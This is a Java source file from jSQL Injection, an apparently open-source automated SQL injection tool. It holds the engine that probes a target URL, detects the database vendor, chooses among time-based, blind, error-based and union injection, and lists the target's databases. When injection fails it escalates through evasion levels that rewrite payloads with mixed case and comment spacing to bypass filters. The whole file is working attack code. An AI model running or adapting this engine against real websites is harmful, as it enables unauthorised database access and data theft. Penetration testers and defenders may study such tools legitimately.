/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLDecoder;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PrivilegedActionException;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.net.ssl.HttpsURLConnection;
import javax.security.auth.login.LoginException;

import net.sourceforge.spnego.SpnegoHttpURLConnection;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.ietf.jgss.GSSException;

import com.jsql.model.accessible.DataAccess;
import com.jsql.model.accessible.RessourceAccess;
import com.jsql.model.bean.database.AbstractElementDatabase;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.PreparationException;
import com.jsql.model.exception.StoppableException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.injection.strategy.NormalStrategy;
import com.jsql.model.injection.strategy.Strategy;
import com.jsql.model.injection.vendor.Vendor;
import com.jsql.model.suspendable.AbstractSuspendable;
import com.jsql.model.suspendable.SuspendableGetCharInsertion;
import com.jsql.model.suspendable.SuspendableGetVendor;
import com.jsql.util.AuthenticationUtil;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.PreferencesUtil;
import com.jsql.util.ProxyUtil;
import com.jsql.util.StringUtil;

/**
 * Model in charge of injection.<br>
 * MVC functionalities are provided by ModelObservable.
 */
public class InjectionModel extends AbstractModelObservable {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(InjectionModel.class);
    
    /**
     * Current version of application.
     */
    public static final String VERSION_JSQL = "0.75";
    
    /**
     * List of running jobs.
     */
    public Map<AbstractElementDatabase, AbstractSuspendable<?>> suspendables = new HashMap<>();
    
    /**
     * i.e, -1 in "[..].php?id=-1 union select[..]"
     */
    public String charInsertion;
    
    /**
     * HTML source of page successfully responding to
     * multiple fields selection (select 1,2,3,..).
     */
    public String srcSuccess;
    
    /**
     * initialUrl transformed to a correct injection url.
     */
    public String indexesInUrl;
    
    /**
     * Current version of database.
     */
    public String versionDatabase;
    
    /**
     * Selected database.
     */
    public String nameDatabase;
    
    /**
     * User connected to database.
     */
    public String username;
    
    /**
     * User authenticated in database.
     */
    public String usernameAuthenticated;
    
    /**
     * Database vendor currently used.
     * It can be switched to another vendor by automatic detection or manual selection.
     */
    public Vendor vendor = Vendor.MYSQL;
    
    /**
     * Database vendor selected by user (default UNDEFINED).
     * If not UNDEFINED then the next injection will be forced to use the selected vendor. 
     */
    public Vendor vendorByUser = Vendor.AUTO;
    
    /**
     * Current injection strategy.
     */
    private Strategy strategy;
    
    /**
     * Allow to directly start an injection after a failed one
     * without asking the user 'Start a new injection?'.
     */
    public boolean injectionIsFinished = false;
    
    public boolean isScanning = false;

    /**
     * Current evasion step, 0 is 'no evasion'
     */
    public int stepSecurity = 0;

    public void sendVersionToView() {
        String versionJava = System.getProperty("java.version");
        String nameSystemArchitecture = System.getProperty("os.arch");
        LOGGER.trace("jSQL Injection v" + VERSION_JSQL + " on java "+ versionJava +"-"+ nameSystemArchitecture +"");
    }

    /**
     * Prepare the injection process, can be interrupted by the user (via shouldStopAll).
     * Erase all attributes eventually defined in a previous injection.
     */
    public void injection() {
        this.charInsertion = null;
        ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex = null;
        this.indexesInUrl = null;

        this.versionDatabase = null;
        this.nameDatabase = null;
        this.username = null;
        this.usernameAuthenticated = null;
        
        this.processIsStopped = false;
        this.injectionIsFinished = false;
        
        this.strategy = null;
        
        RessourceAccess.readingIsAllowed = false;
        
        for (AbstractSuspendable<?> suspendable : this.suspendables.values()) {
            suspendable.stop();
        }
        this.suspendables.clear();

        try {
            ProxyUtil.testProxy();

            LOGGER.info("Starting new injection");
            LOGGER.trace("Connection test...");
            
            ConnectionUtil.testConnection();
            
            // Define insertionCharacter, i.e, -1 in "[..].php?id=-1 union select[..]",
            LOGGER.trace("Get insertion character...");
            
            this.charInsertion = new SuspendableGetCharInsertion().run();
            LOGGER.info("Using insertion character in Url ["+ this.charInsertion +"]");
            
            this.vendor = new SuspendableGetVendor().run();
            
            if (this.vendor == null) {
                this.vendor = Vendor.MYSQL;
                LOGGER.info("Type of database undefined, forcing to ["+ this.vendor +"]");
            } else {
                LOGGER.info("Using database type ["+ this.vendor +"]");
            }
            
            Request requestSetVendor = new Request();
            requestSetVendor.setMessage("SetVendor");
            requestSetVendor.setParameters(this.vendor);
            this.sendToViews(requestSetVendor);

            // Test each injection methods: time, blind, error, normal
            Strategy.TIME.instance().checkApplicability();
            Strategy.BLIND.instance().checkApplicability();
            Strategy.ERRORBASED.instance().checkApplicability();
            Strategy.NORMAL.instance().checkApplicability();

            // Choose the most efficient method: normal > error > blind > time
            if (Strategy.NORMAL.instance().isApplicable()) {
                Strategy.NORMAL.instance().activateStrategy();
                
            } else if (Strategy.ERRORBASED.instance().isApplicable()) {
                Strategy.ERRORBASED.instance().activateStrategy();
                
            } else if (Strategy.BLIND.instance().isApplicable()) {
                Strategy.BLIND.instance().activateStrategy();
                
            } else if (Strategy.TIME.instance().isApplicable()) {
                Strategy.TIME.instance().activateStrategy();
                
            } else if (PreferencesUtil.evasionIsEnabled && this.stepSecurity < 3) {
                // No injection possible, increase evasion level and restart whole process
                this.stepSecurity++;

                LOGGER.warn("Injection failed, testing evasion level " + this.stepSecurity + "...");
                
                Request request = new Request();
                request.setMessage("ResetStrategyLabel");
                this.sendToViews(request);
                
                // sinon perte de insertionCharacter entre 2 injections
                ConnectionUtil.dataQuery += charInsertion;
                this.injection();
                
                return;
            } else {
                throw new PreparationException("Injection failed.");
            }

            //            // Stop injection if database is too old
            //            if (versionDatabase.charAt(0) == '4' || versionDatabase.charAt(0) == '3') {
            //                throw new PreparationException("Old database, automatic search is not possible");
            //            }
            
            if (!this.isScanning) {
                // Get the initial informations from database
                DataAccess.getDatabaseInfos();
    
                // Get the databases
                DataAccess.listDatabases();
            }
            
            LOGGER.info("Done.");
            this.injectionIsFinished = true;
        } catch (PreparationException | StoppableException e) {
            LOGGER.warn(e.getMessage(), e);
        } finally {
            Request request = new Request();
            request.setMessage("EndPreparation");
            this.sendToViews(request);
        }
    }

    /**
     * Run a HTTP connection to the web server.
     * @param dataInjection SQL query
     * @param responseHeader unused
     * @return source code of current page
     */
    public String inject(String newDataInjection, boolean isUsingIndex) {
        HttpURLConnection connection = null;
        URL urlObject = null;

        // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
        String urlInjection = ConnectionUtil.urlByUser;
        
        String dataInjection = newDataInjection;
        urlInjection = this.buildURL(urlInjection, isUsingIndex, dataInjection);

        try {
            urlObject = new URL(urlInjection);
        } catch (MalformedURLException e) {
            LOGGER.warn("Malformed URL " + e.getMessage(), e);
        }

        /**
         * Build the GET query string infos
         * Add primary evasion
         */
        if (ConnectionUtil.dataQuery != null && !"".equals(ConnectionUtil.dataQuery)) {
            urlInjection += this.buildQuery(MethodInjection.QUERY, ConnectionUtil.dataQuery, isUsingIndex, dataInjection);
            try {
                /*
                 * Evasion
                 */
                switch (stepSecurity) {
                    /**
                     * 'Plus' character evasion
                     */
                    case 1:
                        urlInjection = urlInjection
                            .replaceAll("--\\+", "--")
                            .replaceAll("7330%2b1", "7331");
                    break;
                    
                    /**
                     * Case evasion
                     */
                    case 2:
                        urlInjection = urlInjection
                            .replaceAll("union\\+", "uNiOn+")
                            .replaceAll("select\\+", "sElEcT+")
                            .replaceAll("from\\+", "FrOm+")
                            .replaceAll("from\\(", "FrOm(")
                            .replaceAll("where\\+", "wHeRe+")
                            .replaceAll("([AE])=0x", "$1+lIkE+0x");
                    break;
                    
                    /**
                     * Case and Space evasion
                     */
                    case 3:
                        urlInjection = urlInjection
                            .replaceAll("union\\+", "uNiOn/**/")
                            .replaceAll("select\\+", "sElEcT/**/")
                            .replaceAll("from\\+", "FrOm/**/")
                            .replaceAll("from\\(", "FrOm(")
                            .replaceAll("where\\+", "wHeRe/**/")
                            .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x");
                        urlInjection = urlInjection.replaceAll("--\\+", "--")
                            .replaceAll("\\+", "/**/");
                    break;
                    
                    default:
                        break;
                }

                urlObject = new URL(urlInjection);
            } catch (MalformedURLException e) {
                LOGGER.warn("Malformed URL " + e.getMessage(), e);
            }
        }
        
        // Define the connection
        try {
            if (AuthenticationUtil.isKerberos) {
                String kerberosConfiguration = 
                    Pattern
                        .compile("(?s)\\{.*")
                        .matcher(StringUtils.join(Files.readAllLines(Paths.get(AuthenticationUtil.pathKerberosLogin), Charset.defaultCharset()), ""))
                        .replaceAll("")
                        .trim();
                
                SpnegoHttpURLConnection spnego = new SpnegoHttpURLConnection(kerberosConfiguration);
                connection = spnego.connect(urlObject);
            } else {
                connection = (HttpURLConnection) urlObject.openConnection();
            }
            
            connection.setReadTimeout(15000);
            connection.setConnectTimeout(15000);
            connection.setDefaultUseCaches(false);
            HttpURLConnection.setFollowRedirects(PreferencesUtil.isFollowingRedirection);
        } catch (IOException | LoginException | GSSException | PrivilegedActionException e) {
            LOGGER.warn("Error during connection: " + e.getMessage(), e);
        }

        Map<String, Object> msgHeader = new HashMap<>();
        msgHeader.put("Url", urlInjection);
        
        /**
         * Build the HEADER and logs infos
         * #Need primary evasion
         */
        if (!"".equals(ConnectionUtil.dataHeader)) {
            for (String header: this.buildQuery(MethodInjection.HEADER, ConnectionUtil.dataHeader, isUsingIndex, dataInjection).split("\\\\r\\\\n")) {
                Matcher regexSearch = Pattern.compile("(?s)(.*):(.*)").matcher(header);
                if (regexSearch.find()) {
                    String keyHeader = regexSearch.group(1).trim();
                    String valueHeader = regexSearch.group(2).trim();
                    try {
                        if ("Cookie".equalsIgnoreCase(keyHeader)) {
                            connection.addRequestProperty(keyHeader, valueHeader);
                        } else {
                            connection.addRequestProperty(keyHeader, URLDecoder.decode(valueHeader, "UTF-8"));
                        }
                    } catch (UnsupportedEncodingException e) {
                        LOGGER.warn("Unsupported header encoding " + e.getMessage(), e);
                    }
                }
            }
            
            msgHeader.put("Header", this.buildQuery(MethodInjection.HEADER, ConnectionUtil.dataHeader, isUsingIndex, dataInjection));
        }

        /**
         * Build the POST and logs infos
         * #Need primary evasion
         */
        if (!"".equals(ConnectionUtil.dataRequest)) {
            try {
                try {
                    connection.setRequestMethod(ConnectionUtil.typeRequest);
                    // Check whether we are running on a buggy JRE
                } catch (final ProtocolException pe) {
                    try {
                        final Class<?> httpURLConnectionClass = connection.getClass();
                        final Class<?> parentClass = httpURLConnectionClass.getSuperclass();
                        final Field methodField;
                        
                        Field methods = parentClass.getDeclaredField("methods");
                        methods.setAccessible(true);
                        Array.set(methods.get(connection), 1, ConnectionUtil.typeRequest);
                        
                        // If the implementation class is an HTTPS URL Connection, we
                        // need to go up one level higher in the heirarchy to modify the
                        // 'method' field.
                        if (parentClass == HttpsURLConnection.class) {
                            methodField = parentClass.getSuperclass().getDeclaredField("method");
                        } else {
                            methodField = parentClass.getDeclaredField("method");
                        }
                        methodField.setAccessible(true);
                        methodField.set(connection, ConnectionUtil.typeRequest);
                    } catch (final Exception e) {
                        throw new RuntimeException(e);
                    }
                }
                
                connection.setDoOutput(true);
                connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                if (ConnectionUtil.typeRequest.matches("PUT|POST")) {
                    DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
                    dataOut.writeBytes(this.buildQuery(MethodInjection.REQUEST, ConnectionUtil.dataRequest, isUsingIndex, dataInjection));
                    dataOut.flush();
                    dataOut.close();
                }
                
                msgHeader.put("Post", this.buildQuery(MethodInjection.REQUEST, ConnectionUtil.dataRequest, isUsingIndex, dataInjection));
            } catch (IOException e) {
                LOGGER.warn("Error during POST connection " + e.getMessage(), e);
            }
        }
        
        msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));

        // Request the web page to the server
        String line, pageSource = "";
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\r\n";
            }
        } catch (MalformedURLException e) {
            LOGGER.warn("Malformed URL " + e.getMessage(), e);
        } catch (IOException e) {
//            /* lot of timeout in local use */
//            LOGGER.warn("Read error " + e.getMessage(), e);
            // 
        }
        
        // Disable caching of authentication like Kerberos
        connection.disconnect();
        
        msgHeader.put("Source", pageSource);
        
        // Inform the view about the log infos
        Request request = new Request();
        request.setMessage("MessageHeader");
        request.setParameters(msgHeader);
        this.sendToViews(request);

        // return the source code of the page
        return pageSource;
    }

    /**
     * Build correct data for GET, POST, HEADER.<br>
     * Each can be:<br>
     *  - raw data (no injection)<br>
     *  - SQL query without index requirement<br>
     *  - SQL query with index requirement.
     * @param dataType Current method to build
     * @param paramLead Beginning of the request data
     * @param isUsingIndex False if request doesn't use indexes
     * @param sqlTrail SQL statement
     * @return Final data
     */
    private String buildURL(String paramLead, boolean isUsingIndex, String sqlTrail) {
        if (paramLead.contains("*")) {
            if (!isUsingIndex) {
                return paramLead.replace("*", sqlTrail);
            } else {
                return 
                    paramLead.replace("*", 
                        this.indexesInUrl.replaceAll(
                            "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex + "7331",
                            /**
                             * Oracle column often contains $, which is reserved for regex.
                             * => need to be escape with quoteReplacement()
                             */
                            Matcher.quoteReplacement(sqlTrail)
                        )
                    )
                ;
            }
        }
        return paramLead;
    }
    
    private String buildQuery(MethodInjection dataType, String paramLead, boolean isUsingIndex, String sqlTrail) {
        if (ConnectionUtil.methodInjection != dataType || ConnectionUtil.urlByUser.contains("*")) {
            return paramLead;
        } else if (paramLead.contains("*")) {
            if (!isUsingIndex) {
                return paramLead.replace("*", sqlTrail);
            } else {
                return 
                    paramLead.replace("*", 
                        this.indexesInUrl.replaceAll(
                            "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex + "7331",
                            /**
                             * Oracle column often contains $, which is reserved for regex.
                             * => need to be escape with quoteReplacement()
                             */
                            Matcher.quoteReplacement(sqlTrail)
                        )
                    )
                ;
            }
        } else {
            if (!isUsingIndex) {
                return paramLead + sqlTrail;
            } else {
                return 
                    paramLead 
                    + this.indexesInUrl.replaceAll(
                        "1337" + ((NormalStrategy) Strategy.NORMAL.instance()).visibleIndex + "7331",
                        /**
                         * Oracle column often contains $, which is reserved for regex.
                         * => need to be escape with quoteReplacement()
                         */
                        Matcher.quoteReplacement(sqlTrail)
                    )
                ;
            }
        }
    }

    /**
     * Display source code in console.
     * @param message Error message
     * @param source Text to display in console
     */
    public void sendResponseFromSite(String message, String source) {
        LOGGER.warn(message + ", response from site:");
        LOGGER.warn(">>>" + source);
    }

    /**
     * Set injection strategy.
     * @param injectionStrategy Strategy for injection
     */
    public void setStrategy(Strategy strategy) {
        this.strategy = strategy;
    }
    
    public Strategy getStrategy() {
        return strategy;
    }

    /**
     * Send each parameters from the GUI to the model in order to
     * start the preparation of injection, the injection process is
     * started in a new thread via model function inputValidation().
     */
    public void controlInput(
        String getData, String postData, String headerData, MethodInjection method, 
        String httpProtocol, Boolean isScanning
    ) {
        try {
            // Parse url and GET query string
            ConnectionUtil.dataQuery = "";
            Matcher regexSearch = Pattern.compile("(.*)(\\?.*)").matcher(getData);
            if (regexSearch.find()) {
                URL url = new URL(getData);
                ConnectionUtil.urlByUser = regexSearch.group(1);
                if (!"".equals(url.getQuery())) {
                    ConnectionUtil.dataQuery = regexSearch.group(2);
                }
            } else {
                ConnectionUtil.urlByUser = getData;
            }
            
            // Define other methods
            ConnectionUtil.dataRequest = postData;
            ConnectionUtil.dataHeader = headerData;
            ConnectionUtil.methodInjection = method;
            ConnectionUtil.typeRequest = httpProtocol;
            
            // Reset level of evasion
            this.stepSecurity = 0;
            
            if (isScanning) {
                this.injection();
            } else {
                // Start the model injection process in a thread
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        InjectionModel.this.injection();
                    }
                }, "InjectionController - controlInput").start();
                
                // Erase everything in the view from a previous injection
                Request request = new Request();
                request.setMessage("ResetInterface");
                this.sendToViews(request);
            }
        } catch (MalformedURLException e) {
            LOGGER.warn(e.getMessage(), e);
            
            // Incorrect URL, reset the start button
            Request request = new Request();
            request.setMessage("EndPreparation");
            this.sendToViews(request);
        }
    }
}
